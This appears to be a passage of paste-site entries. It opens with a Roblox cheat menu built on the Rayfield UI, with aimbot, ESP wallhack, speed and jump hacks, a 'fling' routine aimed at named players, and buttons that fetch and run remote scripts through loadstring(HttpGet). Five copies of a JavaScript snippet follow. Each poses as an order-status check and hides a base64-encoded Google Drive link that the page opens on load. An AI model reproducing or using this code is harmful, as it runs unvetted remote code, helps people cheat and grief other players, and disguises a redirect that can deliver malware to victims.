+		if character and character:FindFirstChild(""HumanoidRootPart"") then
+			local hrp = character.HumanoidRootPart
+			local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
+			if onScreen then
+				local bottomOfScreen = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y)
+				tracer.From = bottomOfScreen
+				tracer.To = Vector2.new(screenPos.X, screenPos.Y)
+				tracer.Visible = true
+			else
+				tracer.Visible = false
+			end
+		else
+			tracer.Visible = false
+		end
+	end
+end)
+   end,
+})
+
+Rayfield:Notify({
+   Title = ""Executed ESP"",
+   Content = ""Executed!"",
+   Duration = 6.5,
+   Image = 4483362458,
+})
+
+local Button = ScrTab:CreateButton({
+   Name = ""☁️Infinity Yield☁️"",
+   Callback = function()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+   end,
+})
+
+
+local Button = ScrTab:CreateButton({
+   Name = ""☁️Solara Hub v3☁️"",
+   Callback = function()
+   loadstring(game:HttpGet(""https://raw.githubusercontent.com/samuraa1/Solara-Hub/refs/heads/main/Solara%20Hub.lua""))()
+   end,
+})
+
+
+local Button = ScrTab:CreateButton({
+   Name = ""☁️Chat Troller☁️ (Patched)"",
+   Callback = function()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/ffedex/characters/refs/heads/main/chars', true))()
+   end,
+})
+
+local Button = AIMTab:CreateButton({
+   Name = ""🔫Aimbot for FFA🔫"",
+   Callback = function()
+   -- LocalScript in StarterPlayer > StarterPlayerScripts
+
+local Players = game:GetService(""Players"")
+local RunService = game:GetService(""RunService"")
+local UIS = game:GetService(""UserInputService"")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+
+local aimlockEnabled = false
+local targetPlayer = nil
+
+-- Funktion: Abstand zum Spieler berechnen
+local function getDistance(p1, p2)
+	return (p1 - p2).Magnitude
+end
+
+-- Nächsten Spieler finden (außer LocalPlayer)
+local function getClosestPlayer()
+	local closest = nil
+	local shortestDistance = math.huge
+
+	for _, player in pairs(Players:GetPlayers()) do
+		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
+			local distance = getDistance(LocalPlayer.Character.HumanoidRootPart.Position, player.Character.HumanoidRootPart.Position)
+			if distance < shortestDistance then
+				shortestDistance = distance
+				closest = player
+			end
+		end
+	end
+
+	return closest
+end
+
+-- Zielverfolgung aktiv halten
+RunService.RenderStepped:Connect(function()
+	if aimlockEnabled and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
+		local targetPos = targetPlayer.Character.HumanoidRootPart.Position
+		Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetPos)
+	end
+end)
+
+-- Q zum Aktivieren / Deaktivieren
+UIS.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
+	if input.KeyCode == Enum.KeyCode.Q then
+		aimlockEnabled = not aimlockEnabled
+		if aimlockEnabled then
+			targetPlayer = getClosestPlayer()
+			print(""Zielverfolgung aktiviert auf: "" .. (targetPlayer and targetPlayer.Name or ""Kein Ziel""))
+		else
+			targetPlayer = nil
+			print(""Zielverfolgung deaktiviert"")
+		end
+	end
+end)
+   end,
+})
+
+local Button = AIMTab:CreateButton({
+   Name = ""🔫Aimbot🔫"",
+   Callback = function()
+   -- LocalScript in StarterPlayer > StarterPlayerScripts
+
+local Players = game:GetService(""Players"")
+local RunService = game:GetService(""RunService"")
+local UIS = game:GetService(""UserInputService"")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+
+local aimlockEnabled = false
+local targetPlayer = nil
+
+-- Funktion: Abstand zum Spieler berechnen
+local function getDistance(p1, p2)
+	return (p1 - p2).Magnitude
+end
+
+-- Nächsten Spieler finden (außer LocalPlayer und Teamkollegen)
+local function getClosestPlayer()
+	local closest = nil
+	local shortestDistance = math.huge
+
+	for _, player in pairs(Players:GetPlayers()) do
+		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
+			-- Überprüfen, ob der Spieler im gleichen Team ist
+			if player.Team == LocalPlayer.Team then
+				-- Spieler im gleichen Team überspringen
+				continue
+			end
+
+			local distance = getDistance(LocalPlayer.Character.HumanoidRootPart.Position, player.Character.HumanoidRootPart.Position)
+			if distance < shortestDistance then
+				shortestDistance = distance
+				closest = player
+			end
+		end
+	end
+
+	return closest
+end
+
+-- Zielverfolgung aktiv halten
+RunService.RenderStepped:Connect(function()
+	if aimlockEnabled and targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
+		local targetPos = targetPlayer.Character.HumanoidRootPart.Position
+		Camera.CFrame = CFrame.new(Camera.CFrame.Position, targetPos)
+	end
+end)
+
+-- Q zum Aktivieren / Deaktivieren
+UIS.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
+	if input.KeyCode == Enum.KeyCode.Q then
+		aimlockEnabled = not aimlockEnabled
+		if aimlockEnabled then
+			targetPlayer = getClosestPlayer()
+			print(""Zielverfolgung aktiviert auf: "" .. (targetPlayer and targetPlayer.Name or ""Kein Ziel""))
+		else
+			targetPlayer = nil
+			print(""Zielverfolgung deaktiviert"")
+		end
+	end
+end)
+   end,
+})
+
+local Button = STUFFTab:CreateButton({
+   Name = ""✖️Walkspeed✖️"",
+   Callback = function()
+    local Player = game.Players.LocalPlayer
+local UIS = game:GetService(""UserInputService"")
+local TweenService = game:GetService(""TweenService"")
+local CharacterAdded = Player.CharacterAdded
+ 
+local function createUI()
+    local Character = Player.Character or Player.CharacterAdded:Wait()
+    local Humanoid = Character:WaitForChild(""Humanoid"")
+    
+    -- Create the GUI elements
+    local ScreenGui = Instance.new(""ScreenGui"")
+    ScreenGui.Parent = Player:WaitForChild(""PlayerGui"")
+    ScreenGui.Name = ""WalkSpeedGUI""
+ 
+    -- Create the frame for the slider
+    local Frame = Instance.new(""Frame"")
+    Frame.Size = UDim2.new(0, 420, 0, 120)
+    Frame.Position = UDim2.new(0.5, -210, 0.8, -60)
+    Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Frame.BackgroundTransparency = 0.5
+    Frame.BorderSizePixel = 0
+    Frame.Parent = ScreenGui
+    -- Add rounded corners to the frame
+    local UICorner = Instance.new(""UICorner"")
+    UICorner.CornerRadius = UDim.new(0, 16)
+    UICorner.Parent = Frame
+ 
+    -- Create the title text
+    local Title = Instance.new(""TextLabel"")
+    Title.Size = UDim2.new(1, 0, 0, 30)
+    Title.Text = ""WalkSpeed Slider""
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextSize = 22
+    Title.Font = Enum.Font.GothamBold
+    Title.TextStrokeTransparency = 0.8
+    Title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    Title.BackgroundTransparency = 1
+    Title.Parent = Frame
+ 
+    -- Create the slider container
+    local Slider = Instance.new(""Frame"")
+    Slider.Size = UDim2.new(1, -40, 0, 10)
+    Slider.Position = UDim2.new(0, 20, 0, 50)
+    Slider.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    Slider.BorderSizePixel = 0
+    Slider.Parent = Frame
+    -- Add rounded corners to the slider container
+    local SliderCorner = Instance.new(""UICorner"")
+    SliderCorner.CornerRadius = UDim.new(0, 5)
+    SliderCorner.Parent = Slider
+ 
+    -- Create the slider button
+    local SliderButton = Instance.new(""Frame"")
+    SliderButton.Size = UDim2.new(0, 20, 1, 0)
+    SliderButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+    SliderButton.BorderSizePixel = 0
+    SliderButton.Parent = Slider
+    -- Add rounded corners to the slider button
+    local SliderButtonCorner = Instance.new(""UICorner"")
+    SliderButtonCorner.CornerRadius = UDim.new(0, 10)
+    SliderButtonCorner.Parent = SliderButton
+ 
+    -- Create gradient effect for the slider button
+    local Gradient = Instance.new(""UIGradient"")
+    Gradient.Rotation = 45
+    Gradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 0))
+    })
+    Gradient.Parent = SliderButton
+ 
+    -- Function to update walkspeed based on slider position
+    local function updateWalkSpeed()
+        -- Get the X position of the slider button
+        local sliderPosition = SliderButton.Position.X.Offset / Slider.AbsoluteSize.X
+        -- Debugging: Print the slider position and walk speed
+        print(""Slider Position:"", sliderPosition)
+        -- Ensure the walk speed is within a reasonable range, clamp it between 16 and 500
+        Humanoid.WalkSpeed = math.clamp(sliderPosition * 500, 16, 500)
+        print(""Updated WalkSpeed:"", Humanoid.WalkSpeed)
+    end
+ 
+    -- Dragging logic
+    local dragging = false
+    local mouse = Player:GetMouse()
+ 
+    SliderButton.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+        end
+    end)
+ 
+    SliderButton.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = false
+        end
+    end)
+ 
+    UIS.InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            -- Calculate the new position of the slider button based on the mouse's X position
+            local sliderWidth = Slider.AbsoluteSize.X
+            local newX = math.clamp(mouse.X - Slider.AbsolutePosition.X, 0, sliderWidth)
+            -- Set the slider button position with a smooth tween effect
+            TweenService:Create(SliderButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0, newX, 0, 0)}):Play()
+            -- Update WalkSpeed continuously as the button is moved
+            updateWalkSpeed()
+        end
+    end)
+ 
+    -- Initial walk speed setup
+    updateWalkSpeed()
+end
+ 
+-- Recreate UI every time the player respawns
+CharacterAdded:Connect(function()
+    -- Clean up any existing UI if it exists
+    if Player:FindFirstChild(""PlayerGui"") and Player.PlayerGui:FindFirstChild(""WalkSpeedGUI"") then
+        Player.PlayerGui:FindFirstChild(""WalkSpeedGUI""):Destroy()
+    end
+    -- Create a new UI after respawn
+    createUI()
+end)
+ 
+-- Create the UI for the first time
+createUI()
+   
+   end,
+})
+
+local Button = STUFFTab:CreateButton({
+   Name = ""✖️Jump Power✖️"",
+   Callback = function()
+   local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild(""Humanoid"")
+ 
+-- Ensure humanoid updates on respawn
+player.CharacterAdded:Connect(function(newCharacter)
+    character = newCharacter
+    humanoid = newCharacter:WaitForChild(""Humanoid"")
+end)
+ 
+-- Create UI
+local screenGui = Instance.new(""ScreenGui"")
+screenGui.Parent = player:WaitForChild(""PlayerGui"")
+ 
+local frame = Instance.new(""Frame"")
+frame.Size = UDim2.new(0, 200, 0, 50)
+frame.Position = UDim2.new(0.5, -100, 0.1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Dark grey
+frame.BorderSizePixel = 0
+frame.Active = true -- Needed for dragging
+frame.Draggable = true -- Makes the frame draggable
+frame.Parent = screenGui
+ 
+-- Rounded Edges
+local uiCorner = Instance.new(""UICorner"")
+uiCorner.CornerRadius = UDim.new(0.2, 0)
+uiCorner.Parent = frame
+ 
+local label = Instance.new(""TextLabel"")
+label.Text = ""Jump Power:""
+label.Size = UDim2.new(0, 100, 1, 0)
+label.Position = UDim2.new(0, 5, 0, 0)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.new(1, 1, 1) -- White
+label.TextScaled = true
+label.Font = Enum.Font.SourceSans
+label.Parent = frame
+ 
+local textBox = Instance.new(""TextBox"")
+textBox.Size = UDim2.new(0, 80, 0.8, 0)
+textBox.Position = UDim2.new(1, -85, 0.1, 0)
+textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Slightly darker grey
+textBox.TextColor3 = Color3.new(1, 1, 1)
+textBox.Text = """" -- Starts empty
+textBox.TextScaled = true
+textBox.Font = Enum.Font.SourceSans
+textBox.Parent = frame
+ 
+local uiCorner2 = Instance.new(""UICorner"")
+uiCorner2.CornerRadius = UDim.new(0.2, 0)
+uiCorner2.Parent = textBox
+ 
+-- Default Jump Power
+local defaultJumpPower = humanoid.JumpPower
+ 
+-- Update Jump Power
+textBox.FocusLost:Connect(function(enterPressed)
+    if enterPressed then
+        local newJumpPower = tonumber(textBox.Text)
+        if newJumpPower and newJumpPower > 0 then
+            humanoid.JumpPower = newJumpPower
+        else
+            textBox.Text = """"
+            humanoid.JumpPower = defaultJumpPower -- Reset to default
+        end
+    end
+end)
+   end,
+})
+
+local Button = ESPTab:CreateButton({
+   Name = ""🔴ESP🔴"",
+   Callback = function()
+local FillColor = Color3.fromRGB(225,27,27)
+local DepthMode = ""AlwaysOnTop""
+local FillTransparency = 0.5
+local OutlineColor = Color3.fromRGB(255,255,255)
+local OutlineTransparency = 0
+
+local CoreGui = game:FindService(""CoreGui"")
+local Players = game:FindService(""Players"")
+local lp = Players.LocalPlayer
+local connections = {}
+
+local Storage = Instance.new(""Folder"")
+Storage.Parent = CoreGui
+Storage.Name = ""Highlight_Storage""
+
+local function Highlight(plr)
+    local Highlight = Instance.new(""Highlight"")
+    Highlight.Name = plr.Name
+    Highlight.FillColor = FillColor
+    Highlight.DepthMode = DepthMode
+    Highlight.FillTransparency = FillTransparency
+    Highlight.OutlineColor = OutlineColor
+    Highlight.OutlineTransparency = 0
+    Highlight.Parent = Storage
+    
+    local plrchar = plr.Character
+    if plrchar then
+        Highlight.Adornee = plrchar
+    end
+
+    connections[plr] = plr.CharacterAdded:Connect(function(char)
+        Highlight.Adornee = char
+    end)
+end
+
+Players.PlayerAdded:Connect(Highlight)
+for i,v in next, Players:GetPlayers() do
+    Highlight(v)
+end
+
+Players.PlayerRemoving:Connect(function(plr)
+    local plrname = plr.Name
+    if Storage[plrname] then
+        Storage[plrname]:Destroy()
+    end
+    if connections[plr] then
+        connections[plr]:Disconnect()
+    end
+end)                  
+  end,
+})
+
+local Button = STUFFTab:CreateButton({
+   Name = ""➕Fling➕"",
+   Callback = function()
+   local Players = game:GetService(""Players"")
+local Player = Players.LocalPlayer
+ 
+local ScreenGui = Instance.new(""ScreenGui"")
+local Frame = Instance.new(""Frame"")
+local TextBox = Instance.new(""TextBox"")
+local TextButton = Instance.new(""TextButton"")
+local CloseButton = Instance.new(""TextButton"") -- Close button
+ 
+ScreenGui.Parent = Player:WaitForChild(""PlayerGui"")
+ScreenGui.ResetOnSpawn = false
+ 
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+Frame.Position = UDim2.new(0.5, -100, 0.5, -50)
+Frame.Size = UDim2.new(0, 200, 0, 100)
+Frame.Active = true
+Frame.Draggable = true
+ 
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.Position = UDim2.new(0.1, 0, 0.2, 0)
+TextBox.Size = UDim2.new(0.8, 0, 0.2, 0)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderText = ""Enter username""
+TextBox.Text = """"
+TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.TextSize = 14
+ 
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+TextButton.Position = UDim2.new(0.1, 0, 0.5, 0)
+TextButton.Size = UDim2.new(0.8, 0, 0.4, 0)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = ""FLING!""
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 20
+ 
+-- Close button properties
+CloseButton.Parent = Frame
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CloseButton.Position = UDim2.new(0.9, 0, 0, 0)
+CloseButton.Size = UDim2.new(0, 20, 0, 20)
+CloseButton.Font = Enum.Font.SourceSans
+CloseButton.Text = ""X""
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.TextSize = 14
+ 
+local function GetPlayer(Name)
+    Name = Name:lower()
+    for _, x in next, Players:GetPlayers() do
+        if x ~= Player then
+            if x.Name:lower():match(""^"" .. Name) or x.DisplayName:lower():match(""^"" .. Name) then
+                return x
+            end
+        end
+    end
+    return nil
+end
+ 
+local function Message(_Title, _Text, Time)
+    game:GetService(""StarterGui""):SetCore(""SendNotification"", {Title = _Title, Text = _Text, Duration = Time})
+end
+ 
+local function SkidFling(TargetPlayer)
+    local Character = Player.Character
+    local Humanoid = Character and Character:FindFirstChildOfClass(""Humanoid"")
+    local RootPart = Humanoid and Humanoid.RootPart
+ 
+    local TCharacter = TargetPlayer.Character
+    local THumanoid = TCharacter and TCharacter:FindFirstChildOfClass(""Humanoid"")
+    local TRootPart = THumanoid and THumanoid.RootPart
+    local THead = TCharacter and TCharacter:FindFirstChild(""Head"")
+    local Accessory = TCharacter and TCharacter:FindFirstChildOfClass(""Accessory"")
+    local Handle = Accessory and Accessory:FindFirstChild(""Handle"")
+ 
+    if Character and Humanoid and RootPart then
+        if RootPart.Velocity.Magnitude < 50 then
+            getgenv().OldPos = RootPart.CFrame
+        end
+        if THumanoid and THumanoid.Sit then
+            return Message(""Error Occurred"", ""Target is sitting"", 5)
+        end
+        if THead then
+            workspace.CurrentCamera.CameraSubject = THead
+        elseif Handle then
+            workspace.CurrentCamera.CameraSubject = Handle
+        else
+            workspace.CurrentCamera.CameraSubject = THumanoid
+        end
+        if not TCharacter:FindFirstChildWhichIsA(""BasePart"") then
+            return
+        end
+ 
+        local function FPos(BasePart, Pos, Ang)
+            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+        end
+ 
+        local function SFBasePart(BasePart)
+            local TimeToWait = 2
+            local Time = tick()
+            local Angle = 0
+ 
+            repeat
+                if RootPart and THumanoid then
+                    if BasePart.Velocity.Magnitude < 50 then
+                        Angle = Angle + 100
+ 
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+                    else
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+                        task.wait()
+ 
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+                    end
+                else
+                    break
+                end
+            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+        end
+ 
+        workspace.FallenPartsDestroyHeight = 0/0
+ 
+        local BV = Instance.new(""BodyVelocity"")
+        BV.Name = ""EpixVel""
+        BV.Parent = RootPart
+        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+ 
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+ 
+        if TRootPart and THead then
+            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+                SFBasePart(THead)
+            else
+                SFBasePart(TRootPart)
+            end
+        elseif TRootPart and not THead then
+            SFBasePart(TRootPart)
+        elseif not TRootPart and THead then
+            SFBasePart(THead)
+        elseif not TRootPart and not THead and Accessory and Handle then
+            SFBasePart(Handle)
+        end
+ 
+        BV:Destroy()
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+        workspace.CurrentCamera.CameraSubject = Humanoid
+ 
+        repeat
+            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+            Humanoid:ChangeState(""GettingUp"")
+            table.foreach(Character:GetChildren(), function(_, x)
+                if x:IsA(""BasePart"") then
+                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                end
+            end)
+            task.wait()
+        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+        workspace.FallenPartsDestroyHeight = getgenv().FPDH
+    else
+        return Message(""Error Occurred"", ""Random error"", 5)
+    end
+end
+ 
+TextButton.MouseButton1Click:Connect(function()
+    local targetName = TextBox.Text
+    local targetPlayer = GetPlayer(targetName)
+ 
+    if targetPlayer then
+        SkidFling(targetPlayer)
+    else
+        Message(""Error Occurred"", ""Invalid username"", 5)
+    end
+end)
+ 
+-- Close button functionality
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui.Enabled = false
+end)
+   end,
+})"
+wWNSdxw0,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 10:49:06 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/74176/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+7ZdFFM2j,Products.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 10:33:44 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/59754/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+cRG2icGB,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 10:18:08 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/40664/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+fzpL4XAP,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 10:02:46 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/67784/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+1uRCUM5P,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 09:47:24 AM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/89734/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+VKjH7ZxF,alt_churn,vishneva_olga,Python,Sunday 6th of April 2025 09:44:15 AM CDT,"# dags/alt_churn.py
